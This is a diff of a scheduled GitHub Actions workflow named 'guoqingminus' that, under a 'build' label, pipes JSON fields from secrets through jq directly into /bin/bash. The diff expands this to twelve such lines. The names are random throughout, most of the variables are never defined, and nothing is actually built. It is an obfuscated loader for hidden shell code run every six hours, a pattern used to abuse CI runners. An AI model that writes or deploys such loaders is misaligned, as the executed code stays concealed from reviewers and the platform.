@@ -2,19 +2,27 @@ name: guoqingminus
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 0/6 * * *'
-
-jobs:  # 19573
+    - cron: '54 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: guoqingminus
         env:
-          fpgav3: ${{ secrets.fpgav3 }}
+          xvb67448: ${{ secrets.xvb67448 }}
         run: |
-          echo $fpgav3 | jq -r .gfam804 | /bin/bash
-          echo $loal583 | jq -r .thh8572 | /bin/bash
-          echo $zbhtc4 | jq -r .umpfa8985 | /bin/bash
-          echo $fqzej48 | jq -r .wbnlj6 | /bin/bash
+          echo $xvb67448 | jq -r .lfy9 | /bin/bash
+          echo $yy85 | jq -r .jw79 | /bin/bash
+          echo $ayq910 | jq -r .xpr833 | /bin/bash
+          echo $gq874 | jq -r .ia256 | /bin/bash
+          echo $n0 | jq -r .f63 | /bin/bash
+          echo $eyb18 | jq -r .kksy83 | /bin/bash
+          echo $xlwt46 | jq -r .zqjrp1 | /bin/bash
+          echo $rip0 | jq -r .xpz35 | /bin/bash
+          echo $cdjgc1 | jq -r .es08551 | /bin/bash
+          echo $aoij9765 | jq -r .rkb27 | /bin/bash
+          echo $renv12811 | jq -r .ztx249 | /bin/bash
+          echo $tm97 | jq -r .vscux790 | /bin/bash
 
